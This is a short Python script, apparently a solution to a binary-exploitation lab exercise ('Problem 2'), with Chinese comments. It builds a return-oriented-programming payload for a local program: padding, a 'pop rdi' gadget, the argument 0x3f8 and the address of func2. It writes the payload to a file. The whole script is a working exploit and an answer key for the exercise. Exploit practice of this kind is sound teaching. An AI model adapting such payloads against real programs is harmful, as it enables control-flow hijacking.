import struct

# Problem 2 攻击脚本 (ROP)

# 1. 基础信息
padding_len = 16
padding = b'A' * padding_len

# 2. 构造 ROP 链
# 这里的 <Q 表示 64位小端序打包

# [第一步] Gadget: pop rdi; ret
# 地址来源: 4012c7: 5f pop %rdi
pop_rdi_addr = struct.pack('<Q', 0x4012c7)

# [第二步] 参数值
# func2 要求参数为 0x3f8
arg1 = struct.pack('<Q', 0x3f8)

# [第三步] 目标函数 func2
# 地址来源: 401216 <func2>
func2_addr = struct.pack('<Q', 0x401216)

# 3. 组合 Payload
# 栈布局: [Padding] -> [pop_rdi] -> [0x3f8] -> [func2]
payload = padding + pop_rdi_addr + arg1 + func2_addr

# 4. 写入文件
filename = "ans2.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"[+] Payload 已写入 {filename}")
print(f"[+] ROP Chain: pop_rdi -> 0x3f8 -> func2")
print("-" * 30)
print(f"请在终端运行: ./problem2 {filename}")
